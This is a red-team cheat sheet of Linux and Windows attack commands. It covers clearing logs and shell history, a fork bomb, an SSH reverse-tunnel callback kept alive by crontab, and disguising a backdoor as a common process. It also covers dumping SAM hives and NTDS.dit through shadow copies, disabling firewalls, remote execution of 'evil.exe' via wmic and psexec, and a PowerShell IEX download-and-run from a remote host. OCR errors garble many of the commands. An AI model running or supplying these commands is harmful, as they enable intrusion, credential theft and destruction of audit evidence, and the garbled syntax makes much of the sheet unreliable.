********************  Linux Networking Commands  ************************
watch ss -tp                                                   #Network connections
tar cjf file.tar.bz2 files                               #Create .tar.bz2
tar xjf file.tar.bz2                                     #Extract .tar.bz2
gzip file                                                #Compress/rename file
gzip -d file.gz                                          #Decompress file.gz
upx -9 -o out.exe orig.exe                               #UPX packs orig.exe
zip -r zipname.zip \Directory\'                          #Create zip
dd skip=lOOO count=2000 bs=8 if=file of=file             #Cut block 1K-3K from file
split -b 9K \ file prefix                                #Split file into 9K chunks
awk 'sub("$"."\r")' unix.txt win.txt                     #Win compatible txt file
find -i -name file -type '.pdf                           #Find PDF files
find / -perm -4000 -o -perm -2000 -exec ls -ldb {} \;    #Search for setuid files
dos2unix file                                            #Convert to ~nix format
file file                                                #Determine file type/info
chattr (+/-)i file                                       #Set/Unset immutable bit




********************  Linux Misc Commands  ************************
unset HISTFILE                                              #Disable history logging
ssh user@ ip arecord - | aplay -                            #Record remote mic
gee -o outfile myfile.c                                     #Compile C,C++
init 6                                                      #Reboot (0 = shutdown)
cat /etc/'syslog'.conf 1 grep -v "#"                        #List of log files
grep 'href=' file | cut -d"/" -f3 | grep url | sort -u      #Strip links in url.com
dd if=/dev/urandom of= file bs=3145728 count=lOO            #Make random 3MB file




********************  Linux Cover Your Tracks ***********************
echo "" /var/log/auth.log                                 #Clear auth.log file
echo '''' ~/.bash_history                                 #Clear current user bash history
rm ~/.bash history -rf                                    #Delete .bash_history file
history -C                                                #Clear current session history
export HISTFILESIZE=O                                     #Set historj max lines to 0
export HISTSIZE=O                                         #Set histroy max commands to 0
unset HISTFILE                                            #Disable history logging (need to logout to take effect)
kill -9 $$                                                #Kills current session
ln /dev/null -/.bash_history -sf                          #Permanently send all bash history commands to /dev/null
bash -c "exec -a <new name> <backdoor>"                   #starts a back door renaming it to a common process


******************** SSH Tricks  *****************************
ssh root@1.1.1.1 -v -o "UserKnownHostsFile /dev/null" -o "StrictHostKeyChecking no" #SSH Masquerade
cat localfile.txt | ssh user@<ip> " cat > file"                                     #SSH file transfer
ssh -N -M -S /tmp/sshtgt1 user@1.1.1.1                                              #Creates a Control Socket at /tmp/sshtgt1
ssh -S /tmp/sshtgt1 -O forward user@1.1.1.1                                         #Creates an interractive session on target using existing sockets.
/usr/sbin/sshd -D -p 2222 -q -o "AllowTCPForwarding yes" -o "GatewayPorts yes"      #Createsssh server listening on a radom port ready for ssh tunnels 


********************  Linux Scripting  ************************
### PING SWEEP
for x in {1 .. 254 .. l};do ping -c 1 l.l.l.$x | grep "64 b" | cut -d" "-f4 ips.txt; done


### AUTOMATED DOMAIN NAME RESOLVE BASH SCRIPT
#!/bin/bash
echo "Enter Class C Range: i.e. 192.168.3"
read range
for ip in {1 .. 254 .. l};do
host $range.$ip | grep "name pointer" | cut -d" " -fS
done


###FORK BOMB (CREATES PROCESSES UNTIL SYSTEM "CRASHES")
: (){:|: & };:


###DNS REVERSE LOOKUP
for ip in {1 .. 254 .. 1}; do dig -x l.l.l.$ip | grep $ip dns.txt; done;


###IP BANNING SCRIPT
#!/bin/sh
# This script bans any IP in the /24 subnet for 192.168.1.0 starting at 2
# It assumes 1 is the router and does not ban IPs .20, .21, .22
i=2
while [ $i -le 253 ]
do
if [ $i -ne 20 -a $i -ne 21 -a $i -ne 22 ]; then
echo "BANNED: arp -s 192.168.1.$i"
arp -s 192.168.1.$i 00:00:00:00:00:0a
else
echo "IP NOT BANNED: 192.168.1.$i '''''''''."
echo "'''''''''''''''''''''''''" 
fi
i='expr $i +1'
done 


###SSH CALLBACK
Set up script in crontab to callback ever} X minutes. Highly recommend YOU
set up a generic user on red team computer (with no shell privs). Script
will use the private key (located on callback source computer) to connect
to a public key (on red team computer). Red teamer connects to target via a
local SSH session (in the example below, use #ssh -p4040 localhost)
#!/bin/sh
# Callback script located on callback source computer (target)
killall ssh /dev/null 2 &1
sleep 5
REMLIS-4040
REMUSR-user
HOSTS="domainl.com domain2.com domain3.com"
for LIVEHOST in SHOSTS;
do
COUNT-S(ping -c2 $LVEHOST | grep 'received' | awk -F',' ' { print
$2 } ' | awk ' { print $1 } ')
if [[ $COUN7 -gt 0 ]] ; then
ssh -R ${REMLIS}:localhost:22 -i
"/home/$(REMUSR}/.ssh/id rsa" -N $(LIVEHOST} -1 $(REMUSR}
fi




********************  IPTables  ************************
iptables-restore file                                                                #Restore iptables rules
iptables -L -v --line-numbers                                                        #List all iptables rules with affected and line numbers
iptables -F                                                                          #Flush all iptables rules
iptables -P INPUT/FORWARD/OUTPUT ACCEPT/REJECT/DROP                                  #Change default policy for rules that don't match rules
iptables -A INPUT -i interface -m state -state RELATED,ESTABLISHED -j ACCEPT         #Allow established connections on INPUT
iptables -D INPUT 7                                                                  #Delete 7th inbound rule
iptables -t raw -L -n                                                                #Increase throughput by turning off statefulness
iptables -P INPUT DROP                                                               #Drop all packets


### Allow SSH on port 22 outbound
iptables -A OUTPUT -o iface -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A INPUT -i iface -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT


###ALLOW ICMP OUTBOUND
iptacles -A OUTPUT -i iface -p icmp --icmp-type echo-request -j ACCEPT
iptables -A INPUT -o iface -p icmp --icmp-tjpe echo-reply -j ACCEPT


###PORT FORWARD
echo "1" /proc/sys/net/lpv4/lp forward
#OR- sysctl net.ipv4.ip forward=1
iptables -t nat -A PREROUTING -p tcp -i eth0 -j DNAT -d <pivotip> --dport 443 -to-destination <attk-ip>:443
iptables -t nat -A POSTROUTING -p tcp -i eth0 -j SNAT -s target subnet cidr -d <attackip> --dport 443 -to-source <pivotip>
iptables -t filter -I FORWARD 1 -j ACCEPT


###ALLOW ONLY 1.1.1. 0/24, PORTS 80,443 AND LOG DROPS TO /VAR/LOG/MESSAGES
iptables -A INPU~ -s 1.1.1.0/24 -m state --state RELATED,ESTABLISHED,NEW -p tcp -m multipart --dports 80,443 -j ACCEPT
iptables -A INPUT -i ethO -m state --state RELATED,ESTABLISHED -j ACCEPT
iptables -P INPUT DROP
iptables -A OUTPUT -o eth0 -j ACCEPT
iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT
iptables -N LOGGING
iptables -A INPUT -j LOGGING
iptables -A LOGGING -m limit --limit 4/min -j LOG --log-prefix "DROPPED"
iptables -A LOGGING -j DROP




********************  UPDATE-RC.D ***********************
service --status-all                                           #[+] Service starts at boot
                                                               #[-] Service does not start
service service start                                          #Start a service
service service stop                                           #Stop a service
service service status                                         #Check status of a service
update-rc.d -f service remove                                  #Remove a service start up cmd
update-rc.d service defaults                                   #Add a start up service




********************  CHKconfig ***********************
chkconfig --list                                               #List existing services and run status
chkconfig service -list                                        #Check single service status
chkconfig service on [--level 3]                               #Add service [optional to add level at which service runs)
chkconfig service off [--level 3]                              #Remove service




********************  X11 ***********************
###Capture remote X11 window and convert to jpg
xwd -display ip :0 -root -out /tmp/test.xpm
xwud -in /tmp/test1.xpm
convert /tmp/test.xpm -resize 1280x1024 /tmp/test.jpg


###Open X11 stream viewing
xwd -display 1.1.1.1:0 -root -silent -out x11dump             #Read dumped file with xwudtopnm or GIMP




********************  TCPDump ***********************
tcpdump -i ethO -XX -w out.pcap                                                     #CAPTURE PACKETS ON ETH0 IN ASCII AND HEX AND WRITE TO FILE
tcpdump -i ethO port 80 dst 2.2.2.2                                                 #CAPTURE HTTP TRAFFIC TO 2.2.2.2
tcpdump -i ethO -tttt dst 192.168.1.22 and not net 192.168.1.0/24                   #SHOW CONNECTIONS TO A SPECIFIC IP
tcpdump -i ethO 'icmp[icmptype] == icmp-echoreply'                                  #PRINT ALL PING RESPONSES
tcpdump -i ethO -c 50 -tttt 'udp and port 53'                                       #CAPTURE 50 DNS PACKETS AND PRINT TIMESTAMP
file2cable -i ethO -f file.pcap                                                     #Replay Pcap
tcpreplay --topspeed --loop=O --intf=ethO .pcap_file_to replay mbps=l0|100|1000     #Replay packet DOS




********************  Additional Kali Commands ***********************
#WMIC EQUIVALENT
wmis -U DOMAIN\ user % password // DC cmd.exe /c command


###MOUNT SMB SHARE
mount.cifs // ip /share /mnt/share -o user= user ,pass= pass ,sec=ntlmssp,domain= domain ,rw        # Mounts to /mnt/share. For other options besides ntlmssp, man mount.cifs

enum4linux <IP>                                                                 #A very detailed remote SMB enumeration 
/usr/share/doc/python-impacket/examples/psexec.py domain/user:'password'@<ip>   #psexec but cleaner
winexe -U domain.name/username //ip C:\\windows\\bad.exe --system               #Executes Bad.exe on remote windows box.

********************  PFSense ***********************
pfSsh.php                                                   #pfSense Shell System
pfSsh.php playback enableallowallwan                        #Allow all inbound WAN connections (adds to visible rules in WAN rules)
pfSsh.php playback enablesshd                               #Enable ssh inbound/outbound
pfctl -sn                                                   #Show NAT rules
pfctl -sr                                                   #Show filter rules
pfctl -sa                                                   #Show all rules
pfctl -d                                                    #Disables all rules
pfctl -e                                                    #Enables all rules
viconfig                                                    #Edit config
rm /tmp/config.cache                                        #Remove cached (backup) config after editing the current running
/etc/rc.reload_all                                          #Reload entire config




********************  Windows Versions ***********************
NT 3.1             #Windows NT 3.1 (All)
NT 3.5             #Windows NT 3.5 (All)
NT 3.51            #Windows NT 3.51 (All)
NT 4.0             #Windows NT 4.0 (All)
NT 5.0             #Windows 2000 (All)
NT 5.1             #Windows XP (Home, Pro, MC, Tablet PC, Starter, Embedded)
NT 5.2             #Windows XP 64-bit, Server 2003 & R2, Windows Home Server
NT 6.0             #Windows Vista, Server 2008
NT 6.1             #Windows 7, Server 2008 R2
NT 6.2             #Windows 8, Windows Server 2012
NT 6.3             #Windows 8.1, Windows Server 2012 R2
NT 10              #Windows 10, Windows Server 2016



********************  Windows Files ***********************
%SYSTEMROOT%                                             #Typically C:\Windows
%SYSTEMROOT%\System32\drivers\etc\hosts                  #DNS entries
%SYSTEMROOT%\System32\drivers\etc\networks               #Network settings
%SYSTEMROOT%\system32\config\SAM                         #User & password hashes
%SYSTEMROOT%\repair\SAM                                  #Backup copy of SAM
%SYSTEMROOT%\System32\config\RegBack\SAM                 #Backup copy of SAM
%WINDIR%\system32\config\AppEvent.Evt                    #Application Log
%WINDIR%\system32\config\SecEvent.Evt                    #Security Log
%ALLUSERSPROFILE%\Start Menu\Programs\Startup\           #Startup Location
%USERPROFILE%\Start Menu\Programs\Startup\               #Startup Location
%SYSTEMROOT%\Prefetch                                    #Prefetch dir (EXE logs)
C:\windows\system32\drivers\etc\hosts                    #Checks here before a dns request is sent


********************  Startup Directory ***********************
###Windows NT 6.1,6.0
%SystemDrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup                             # All users
%SystemDrive%\Users\%UserName%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup        # Specific users


###Windows NT 5.2, 5.1, 5.0
%SystemDrive%\Documents and Settings\All Users\Start Menu\Programs\Startup




********************  Windows System Info Commands ***********************
version                                                                            #Get OS version
systeminfo                                                                         #enumerates basic system info
sc query state=all                                                                 #Show services
tasklist /svc                                                                      #Show processes & services
tasklist /m                                                                        #Show all processes & DLLs
tasklist /S ip /v                                                                  #Remote process listing
taskkill /PID <pid> /F                                                             #Force process to terminate
systeminfo /S ip /U domain\user /P Pwd                                             #Remote system info
reg query\\ ip \ RegDomain \ Key /v Value                                          #Query remote registry, /s=all values
reg query HKLM /f password /t REG_SZ /s                                            #Search registry for password
fsutil fsinfo drives                                                               #List drives •must be admin
dir /a /s /b c:\'.pdf'                                                             #Search for all PDFs
dir /a /b c:\windows\kb'                                                           #Search for patches
findstr /si password' .txt | '.xml |.xls                                           #Search files for password
tree /F /A c:\ tree.txt                                                            #Directory listing of C:
reg save HKLM\Security security.hive                                               #Save security hive to file
echo %USERNAME%                                                                    #Current user
type <file>                                                                        #View contents of a file
Get-WindowsDriver -Online -ALL                                                     #List all loaded drivers
Get-ChildItem | Select-Object name,CreationTime,LastAccessTime,LastWriteTime       #lists mac timestamp
wmic process get commandline,processid, parentprocessid /format:list               #lists process name, pid and ppid





********************  Windows Net/Domain Commands ***********************
net view /domain                                                #Hosts in current domain
net view /domain: [MYDOMAIN]                                    #Hosts in [MYDOMAIN]
net user /domain                                                #All users in current domain
net user user pass /add                                         #Add user
net localgroup "Administrators" user /add                       #Add user to Administrators
net accounts /domain                                            #Domain password policy
net localgroup "Administrators"                                 #List local Admins
net group /domain                                               #List domain groups
net group "Domain Admins" /domain                               #List users in Domain Admins
net group "Domain Controllers" /domain                          #List DCs for current domain
net share                                                       #Current SMB shares
net session / find / "\\"                                       #Active SHB sessions
net user user /ACTIVE:yes /domain                               #Unlock domain user account
net user user " newpassword " /domain                           #Change domain user password
net share share c:\share /GRANT:Everyone,FULL                   #Share folder
net start telnet                                                #Starts telnet, however the service must first be enabled


********************  Windows Remote Commands ***********************
tasklist /S ip /v                                                                    #Remote process listing
systeminfo /S ip /U domain\user /P Pwd                                               #Remote systeminfo
net share \\ ip                                                                      #Shares of remote computer
net use \\ ip                                                                        #Remote filesystem (IPC$)
net use z: \\ ip \share password /user: DOMAIN\ user                                 #Map drive, specified credentials
reg add \\ ip \ regkey \ value                                                       #Add registry key remotely
sc \\ ip create service        binpath=C:\Windows\System32\x.exe start= auto         #Create a remote service (space after start=)
xcopy /s \\ ip \dir C:\local                                                         #Copy remote folder
shutdown /m \\ ip /r /t 0 /f                                                         #Remotely reboot machine




********************  Windows Network Commands ***********************
ipconfig / all                                                       #IP configuration
ipconfig /displaydns                                                 #Local DNS cache
netstat -ano                                                         #Open connections
netstat -anop tcp 1                                                  #Netstat loop
netstat -an | findstr LISTENING                                      #LISTENING ports
route print                                                          #Routing table
ipconfig /displaydns                                                 #dns cashe
arp -a                                                               #Known MACs (ARP table)
nslookup, set type=any, ls -d domain results.txt, exit               #DNS Zone Xfer
nslookup -type=SRV _www._tcp.url.com                                 #Domain SRV lookup ( ldap, kerberos, sip)
tftp -I ip GET remotefile                                            #TFTP file transfer
netsh wlan show profiles                                             #Saved wireless profiles
netsh firewall set opmode disable                                    #Disable firewall ('Old)
netsh wlan export profile folder=. key=clear                         #Export wifi plaintext pwd
netsh interface ip show interfaces                                   #List interface IDs/MTUs
netsh interface ip set address local static ip nmask gw ID           #Set IP
netsh interface ip set dns local static ip                           #Set DNS server
netsh interface ip set address local dhcp                            #Set interface to use DHCP




********************  Windows Utility Commands ***********************
type file                                                            #Display file contents
del path\' .' /a /s /q /f                                            #Forceably delete all files in path
find /I "str" filename                                               #Find "str"
command | find /c /v ""                                              #Line count of cmd output
at HH:Ml1 file [args] (i.e. at 14:45 cmd /c)                         #Schedule file to run
runas /user: user " file [args] "                                    #Run file as user
restart /r /t 0                                                      #Restart now
tr -d '\15\32' win.txt unix.txt                                      #Removes CR & 'Z ('nix)
makecab file                                                         #Native compression
Wusa.exe /uninstall /kb: ###                                         #Uninstall patch
cmd.exe "wevtutil qe Application /c:40 /f:text /rd:true"             #CLI Event Viewer
lusrrngr.rnsc                                                        #Local user manager
services.msc                                                         #Services control panel
taskmgr.exe                                                          #Task manager
secpool.msc                                                          #Security policy manager
eventvwr.msc                                                         #Event viewer
type c:\anyfile.exe > c:\winnt\system32\calc.exe:anyfile.exe         #Sets ADS
star c:\winnt\system32\calc.exe:anyfile.exe                          #executes an ADS
Taskkill /PID <26356> /F                                             #Kill a process
wevtutil el | Foreach-Object {wevtutil cl "$_"}                      #clear all logs


********************  Windows Netsh Commands **********************
netsh advfirewall firewall show rule name=all                                                                                           #Shows all firewall rules
netsh advfirewall rule name="SQL Server" dir=in action=allow protocol=tcp localport=5555 enable=yes profile=any                         #Poke hole in firewall 
netsh interface portproxy add v4tov4 listen port=4444 listenaddress=<thisboxIP> connectport=22 connectaddress=<T2IP> protocol=tcp       #Port Forwarding
netsh advfirewall set currentprofile state off                                                                                          #Turns all firewalls off, Win 7 and up
netsh advfirewall set allprofiles state off                                                                                             #Turns Current firewall off, Win 7 and up


********************  Windows Misc. Commands ***********************
###LOCK WORKSTATION
rundll32.dll user32.dll LockWorkstation


###NATIVE WINDOWS PORT FORWARD ( * MUST BE ADMIN)
netsh interface portproxy add v4tov4 listenport=3000 listenaddress=l.l.l.l connectport=4000 connectaddress=2.2.2.2
#Remove
netsh interface portproxy delete v4tov4 listenport=3000 listenaddress=l.l.l.l


###RE-ENABLE COMMAND PROMPT
reg add HKCU\Software\Policies\t1icrosoft\Windows\System /v DisableCHD /t REG DWORD /d 0 /f




********************  PSexec ***********************
###EXECUTE FILE HOSTED ON REMOTE SYSTEM WITH SPECIFIED CREDENTIALS
psexec /accepteula \\ targetiP -u domain\user -p password -c -f \\ smbiP \share\file.exe


###RUN REMOTE COMMAND WITH SPECIFIED HASH
psexec /accepteula \\ ip -u Domain\user -p LM : NTLM cmd.exe /c dir c:\Progra~1


###RUN REMOTE COMMAND AS SYSTEM
psexec /accepteula \\ ip -s cmd.exe




********************  Terminal Services (RDP) ***********************
###Start RDP
1. Create regfile.reg file with following line in it:
HKEY LOCAL MACHINE\SYSTEM\CurrentControlSet \Control\TerminalService
2. "fDenyTSConnections"=dword: 00000000
3. reg import reg file. reg
4. net start "terrnservice"
5. sc config termservice start= auto
6. net start termservice
--OR--
reg add "HKEY LOCAL MACHINE\SYSTEM\CurentControlSet\Control \Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f


###TUNNEL RDP OUT PORT 443 (MAY NEED TO RESTART TERMINAL SERVICES)
REG ADD "HKLM\System\CurrentControlSet\Control \Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 443 /f


###DISABLE NETWORK LEVEL AUTHENTICATION, ADD FIREWALL EXCEPTION
reg add "HKEY LOCAL t1ACHINE\SYSTEt1\CurentControlSet\Control \Terminal Server\WinStations\RDP-TCP" /v UserAuthentication /t REG_DWORD /d "0" /f
netsh firewall set service type = remotedesktop mode = enable


###IMPORT A SCHEDULE TASK FROM AN "EXPORTED TASK" XML
schtasks.exe /create /tn MyTask /xml "C:\MyTask.xml" /f




********************  WMIC ***********************
wmic [alias] get /?                                     #List all attributes
wmic [alias] call /?                                    #Callable methods
wmic process list full                                  #Process attributes
wmic startupwmic service                                #Starts wmic service
wmic ntdomain list                                      #Domain and DC info
wmic qfe                                                #List all patches
wmic process call create "process name"                 #Execute process
wmic process where name="process" call terminate        #Terminate process                                                                        #
wmic logicaldisk get description,name                   #View logical shares
wmic cpu get DataWidth /format:list                     #Display 32 I I 64 bit


###WMIC [ALIAS] [WHERE] [CLAUSE]
[alias] == process, share, startup, service, nicconfig, useraccount, etc.
[where] ==where (name="cmd.exe"), where (parentprocessid!=[pid]"), etc.
[clause] ==list [fulllbrief], get [attribl, attrib2], call [method],delete


###EXECUTE FILE HOSTED OVER SMB ON REMOTE SYSTEM WITH SPECIFIED CREDENTIALS
wmic /node: targetiP /user:domain\user /password:password process call create "\\ smbiP \share\evil.exe"


###UNINSTALL SOFTWARE
wmic product get name /value                                                                         # Get software names
wmic product where name="XXX" call uninstall /nointeractive


###REMOTELY DETERMINE LOGGED IN USER
wmic /node:remotecomputer computersystern get username


###REMOTE PROCESS LISTING EVERY SECOND
wmic /node:machinename process list brief /every:l


###REMOTELY START RDP
wmic /node:"machinename 4" path Win32_TerminalServiceSetting where AllowTSConnections="O" call SetAllowTSConnections "1"


###LIST NUMBER OF TIMES USER HAS LOGGED ON
wmic netlogin where (name like "%adm%") get numberoflogons


###SEARCH FOR SERVICES WITH UNQUOTED PATHS TO BINARY
wmic service get name,displayname,pathname,startrnode | findstr /i "auto"
| findstr /i /v "C:\windows\\" lfindstr /i /v """


###VOLUME SHADOW COPY
1. wmic /node: DC IP /user:"DOMAIN\user" /password:"PASS" process call create "cmd /c vssadmin list shadows 2 &1 c:\temp\output.txt"
#If any copies already exist then exfil, otherwise create using
following commands. Check output.txt for any errors
2. wmic /node: DC IP /user:"D0MAIN\user" /password:"PASS" process call create "cmd /c vssadmin create shadow /for=C: 2 &1 C:\temp\output.txt"
3. wmic /node: DC IP /user:"DOMAIN\user" /password:"PASS" process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\system.hive 2 &1 C:\temp\output.txt"
4. wmic /node: DC IP /user:"DOMAIN\user" /password:"PASS" process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyc\NTDS\NTDS.dit C:\temp\ntds.dit 2&1 C:\temp\output.txt"
Step by step instructions on room362.com for step below
5. From Linux, download and run ntdsxtract and libesedb to export hashes or other domain information
a. Additional instructions found under the VSSOWN section
b. ntdsxtract- http://www.ntdsxtract.com
c. libesedb- http://code.google.com/p/libesedb/




********************  Powershell ***********************
powershell.exe -nop -exec bypass                                    #start powershell
$psversiontable.psversion                                           #displays powershell version
set-executionpolicy unrestricted                                    #allows execution of any scritp
stop-transcript                                                     #Stops recording
get-content file                                                    #displays file contents
get-help command -examples                                          #Shows examples of command
get-command ' string '                                              #Searches for cmd string
get-service                                                         #Displays services (stopservice, start-service)
get-wmiobject -class win32_service                                  #Display powershell version
$PSVesionTable                                                      #Run powershell 2.0 from 3.0
powershell.exe -version 2.0                                         #Returns # of services
get-service measure-object                                          #Returns list of PSDrives
get-psdrive                                                         #Returns only names
get-process select -expandproperty name                             #Cmdlets that take creds
get-help ' -parameter credential                                    #Available WMI network cmds
get-wmiobject -list -'network (Net.DNS]: :GetnostEntry(" ip")       #DNS Lookup
Get-FileHash <file> -Algorithm MD5                                  #Hash a file
get-process -id <pid> | select -expand modules                      #list process dlls
Get-ChildItem -path C:\Windows | Select-Object name, lastaccesstime, lastwritetime, creationtime | Sort-Object -Property lastwritetime | format-table -AutoSize     #file time stamps
Get-ChildItem -Path C:\ -recurse -force -ErrorAction SilentlyContinue | Where-Object { $_.LastWriteTime -ge (Get-Date).AddMinutes(-120) }                           #liost files changed in last 2 hours
$tasks = schtasks.exe /query /v /fo csv | ConvertFrom-Csv; $tasks | where-object {$_.'Scheduled Task State' -eq "Enabled"} | select-object TaskName, 'Task To Run'  #schtasks to run
Get-wmiobject win32_service | where-object { $_.StartMode -eq 'Auto' } | format-list Name, DisplayName, PathName                                                    #Services
get-winevent @{logname='application','security','system';starttime=[datetime]::today} | select logname, timecreated, id, message | formate-table -autosize          #Check event logs
get-itemproperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\WindowsUpdate\Auto Update\Results\Detect" | Select-Object lastsuccesstime                         #last time windows updated
get-itemproperty "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment"                                                                               # Windows Env variables
get-itemproperty "HKCU:\network\*"                                                                                                                                  #list shares
auditpol /get /catagory:*                                                                                                                                           #lists audit polocies
IEX (New-Object Net.Webclient).DownloadString("http://10.10.20.137:8000/mando.ps1")                                                                                 #download script to memory
import-module c:\windows\system32\config\mslog.ps1                                                                                                                  #ingest script into memory

###DISABLE POWERSHELL LOGGING%%
reg query HKLM\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\Transcription EnableTranscripting = 1   # is on
